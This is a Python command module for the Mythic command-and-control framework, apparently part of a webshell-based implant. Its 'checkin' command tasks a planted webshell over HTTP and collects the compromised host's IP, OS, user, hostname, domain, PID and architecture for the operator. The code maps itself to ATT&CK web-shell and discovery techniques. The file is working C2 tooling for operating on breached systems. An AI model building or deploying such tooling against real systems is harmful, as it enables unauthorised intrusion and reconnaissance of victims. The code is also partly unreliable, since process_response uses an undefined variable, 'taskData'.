import base64
import logging
from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
from enyxma.WebshellRPC import WebshellRPC

logger = logging.getLogger(__name__)

class CheckinArguments(TaskArguments):
    """
    No arguments are needed for checkin; this will collect system info.
    """
    def __init__(self, command_line: str = "", **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = []

    async def parse_arguments(self):
        # nothing to parse
        pass

class CheckinCommand(CommandBase):
    cmd = "checkin"
    needs_admin = False
    help_cmd = "checkin"
    description = "Gather system information (IP, OS, user, host, domain, PID, arch)"
    version = 1
    author = "@Termindiego25"
    argument_class = CheckinArguments
    attackmapping = ["T1016", "T1033", "T1057", "T1082", "T1087", "T1071.001", "T1132.001", "T1505.003"]  

    async def create_go_tasking(
        self,
        taskData: PTTaskMessageAllData
    ) -> PTTaskCreateTaskingMessageResponse:
        """
        Construct and encrypt the 'checkin' payload, send it to the webshell,
        then decrypt, update the callback metadata and return a user‐readable summary.
        """
        # build initial RPC response
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=False,
            Completed=True,
        )

        # Construct the command in the form "checkin"
        command = f"checkin"
        logger.info(f"Preparing checkin command: {command}")

        try:
            # Determine the request method from the C2 profile parameters
            requestType = taskData.C2Profiles[0].Parameters.get("request_type", "POST").upper()
            logger.info(f"Request type for checkin: {requestType}")
            
            # Dispatch the command based on the chosen HTTP method
            if requestType == "GET":
                response_data = await WebshellRPC.GetRequest(
                    taskData.Payload.UUID, command.encode(), taskData
                )
            else:
                response_data = await WebshellRPC.PostRequest(
                    taskData.Payload.UUID, command.encode(), taskData
                )

            if len(response_data) == 0:
                # if the agent asked us to retry, leave manual args
                taskData.args.set_manual_args(command)
                response.Success = True
                response.Completed = False
                return response

            
            # parse and update callback metadata
            info = response_data.decode("UTF-8").split("|")
            await SendMythicRPCCallbackUpdate(
                MythicRPCCallbackUpdateMessage(
                    AgentCallbackUUID=taskData.Callback.AgentCallbackID,
                    IP=info[0],
                    OS=info[1],
                    User=info[2],
                    Host=info[3],
                    Domain=info[4],
                    PID=int(info[5]),
                    Architecture=info[6]
                )
            )

            # send a nice summary back to the user
            human = (
                f"IP: {info[0]}\n"
                f"OS: {info[1]}\n"
                f"User: {info[2]}\n"
                f"Host: {info[3]}\n"
                f"Domain: {info[4]}\n"
                f"PID: {info[5]}\n"
                f"Arch: {info[6]}"
            )
            await SendMythicRPCResponseCreate(
                MythicRPCResponseCreateMessage(
                    TaskID=taskData.Task.ID,
                    Response=human.encode()
                )
            )
            response.Success = True

        except Exception as e:
            logger.exception("[checkin] error during processing")
            response.TaskStatus = "error: processing"
            response.Error = str(e)

        if response.Error:
            await SendMythicRPCResponseCreate(
                MythicRPCResponseCreateMessage(
                    TaskID=taskData.Task.ID,
                    Response=response.Error.encode()
                )
            )
        return response

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        info = response.decode("UTF-8").split('|')
        human = (
            f"IP: {info[0]}\n"
            f"OS: {info[1]}\n"
            f"User: {info[2]}\n"
            f"Host: {info[3]}\n"
            f"Domain: {info[4]}\n"
            f"PID: {info[5]}\n"
            f"Arch: {info[6]}"
        )
        await SendMythicRPCResponseCreate(
            MythicRPCResponseCreateMessage(
                TaskID=taskData.Task.ID,
                Response=human.encode()
            )
        )
        return resp